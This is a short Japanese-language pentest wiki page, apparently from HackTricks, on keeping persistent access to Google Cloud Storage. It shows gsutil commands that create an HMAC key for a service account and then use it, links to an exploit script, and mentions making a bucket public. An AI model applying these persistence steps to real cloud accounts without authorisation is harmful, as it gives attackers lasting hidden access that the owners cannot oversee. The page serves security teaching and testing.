# GCP - ストレージの永続性

{{#include ../../../banners/hacktricks-training.md}}

## ストレージ

Cloud Storageに関する詳細情報は、以下を確認してください:

{{#ref}}
../gcp-services/gcp-storage-enum.md
{{#endref}}

### `storage.hmacKeys.create`

バケット上で永続性を維持するためにHMACを作成できます。この技術に関する詳細は[**こちらを確認してください**](../gcp-privilege-escalation/gcp-storage-privesc.md#storage.hmackeys.create)。
```bash
# Create key
gsutil hmac create <sa-email>

# Configure gsutil to use it
gsutil config -a

# Use it
gsutil ls gs://[BUCKET_NAME]
```
別のこの方法のエクスプロイトスクリプトは[こちら](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/storage.hmacKeys.create.py)で見つけることができます。

### 公開アクセスを与える

**バケットを公開可能にする**ことは、バケットへのアクセスを維持する別の方法です。方法については以下を確認してください：

{{#ref}}
../gcp-post-exploitation/gcp-storage-post-exploitation.md
{{#endref}}

{{#include ../../../banners/hacktricks-training.md}}
